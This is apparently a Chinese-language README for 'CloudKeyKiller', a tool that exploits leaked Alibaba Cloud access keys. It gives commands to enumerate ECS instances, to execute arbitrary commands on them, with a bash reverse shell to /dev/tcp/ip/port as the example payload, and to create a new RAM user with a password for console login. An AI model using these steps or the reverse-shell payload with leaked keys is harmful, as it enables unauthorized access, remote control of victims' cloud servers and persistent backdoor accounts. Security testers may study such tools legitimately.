# CloudKeyKiller

# 前言

先说一下这个工具解决了什么，经常能遇到很多AK泄露，在前端JS中，APP中，小程序源码中碰到，有时候单独拿到AK去尝试权限是比较麻烦的，我也想是否有必要写一款这种工具，答案是：可以的

不过写的中间其实不难发现，这就是一个体力活，如果可以，其实完全可以把API都调一遍，是吧，就知道这个AK的权限有多大了

不过我还是想，能否通过API来判断该AK的权限有多少，通过这些有的权限进行利用

再一个难点其实就是环境差别太大了，首先不知道拿到AK的时候我们是黑盒的情况下，不知道权限有多大，再一个就是，这种类型的工具，它的兼容性和适配性必须要好，因为不同的KEY会有不同的结果，所以我希望使用这款工具中遇到的问题，尽管提issue，因为这能帮助这款工具更快的迭代和发现问题

况且这工具开发时间很短，除了熟悉API的时间，写代码的时间可能也就1个小时，甚至更少，况且这种工具属于重复造轮子，调API就可以了

## 初始配置

将自己的对应云厂商AK写入/config/conf.py中即可

![image-20220414185136736](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220414185136736.png)

## ECS

### 获取所有ECS

```bash
python3 -aliyun ecs getecs
```

![image-20220414185023728](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220414185023728.png)

### 在指定ECS中执行命令

```bash
python3 main.py -aliyun ecs exec instanceid command RegionId
```

- instanceid

  - ECS中的InstanceID

- command

  - 你要执行的命令

    ```bash
    bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'
    ```

- RegionID

  - 地区ID

```bash
python3 main.py -aliyun ecs exec i-2556rj "bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'" cn-beijing
```

![image-20220414190034115](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220414190034115.png)

## RAM

为什么要创建RAM？为什么常见RAM之后，就可以通过账号登录到阿里云控制台

### 创建RAM用户

```bash
python3 main.py -aliyun ram createram 账号 密码
```

![image-20220414215019769](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220414215019769.png)

# 推荐一个云安全wiki

- https://github.com/teamssix/twiki